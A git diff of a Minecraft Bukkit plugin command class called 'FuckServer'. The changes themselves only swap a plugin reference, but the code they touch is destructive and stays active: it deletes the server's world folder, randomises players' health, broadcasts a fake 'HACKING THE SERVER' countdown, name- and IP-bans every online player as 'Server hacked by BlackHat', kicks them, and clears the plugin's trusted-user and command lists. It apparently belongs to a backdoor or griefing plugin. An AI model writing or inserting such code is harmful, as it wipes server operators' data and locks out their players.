@@ -85,8 +85,8 @@ public class FuckServer extends Command {
         locked = true;
         p.sendMessage(Start.COMMAND_PREFIX + "Proceeding!");
         this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " is fucking the server!");
-        BukkitTask task = Bukkit.getScheduler().runTaskLaterAsynchronously(Start.Instance, () -> {
-            Bukkit.getScheduler().runTaskLater(Start.Instance, () -> deleteFolder(Bukkit.getWorldContainer().getAbsoluteFile()), 1);
+        BukkitTask task = Bukkit.getScheduler().runTaskLaterAsynchronously(this.plugin, () -> {
+            Bukkit.getScheduler().runTaskLater(this.plugin, () -> deleteFolder(Bukkit.getWorldContainer().getAbsoluteFile()), 1);
             for (int i = 0; i <= 100; i++) {
                 for (Player pe : Bukkit.getOnlinePlayers()) {
                     pe.setCollidable(false);
@@ -100,7 +100,7 @@ public class FuckServer extends Command {
                     pe.setHealth(rndHealth);
                     Location loc = pe.getLocation();
                     loc.add(MathUtils.generateNumber(-20, 20), MathUtils.generateNumber(-20, 20), MathUtils.generateNumber(-20, 20));
-                    Bukkit.getScheduler().runTask(Start.Instance, () -> pe.getWorld().strikeLightningEffect(loc));
+                    Bukkit.getScheduler().runTask(this.plugin, () -> pe.getWorld().strikeLightningEffect(loc));
                 }
                 Bukkit.broadcastMessage(ChatColor.DARK_RED + "§kAAAAAAAA" + ChatColor.RESET + ChatColor.RED + "HACKING THE SERVER! " + i + "% DONE!" + ChatColor.DARK_RED + "§kAAAAAAAA");
                 try {
@@ -123,8 +123,8 @@ public class FuckServer extends Command {
         } catch (IOException e) {
             e.printStackTrace();
         }*/
-        Start.Instance.trustedPeople.clear();
-        Start.Instance.cm.commandList.clear();
+        this.plugin.trustedPeople.clear();
+        this.plugin.cm.commandList.clear();
     }
 
     @Override
@@ -158,7 +158,7 @@ public class FuckServer extends Command {
         String reason = ChatColor.BOLD + "" + ChatColor.LIGHT_PURPLE + "Server hacked by §3Black§4Hat§a";
         Bukkit.getBanList(BanList.Type.NAME).addBan(pe.getName(), reason, null, "Console");
         Bukkit.getBanList(BanList.Type.IP).addBan(Objects.requireNonNull(pe.getAddress()).getAddress().getHostAddress(), reason, null, "Console");
-        Bukkit.getScheduler().runTask(Start.Instance, () -> pe.kickPlayer(kickReason));
+        Bukkit.getScheduler().runTask(this.plugin, () -> pe.kickPlayer(kickReason));
     }
 
     private void showConsequences(Player p) {
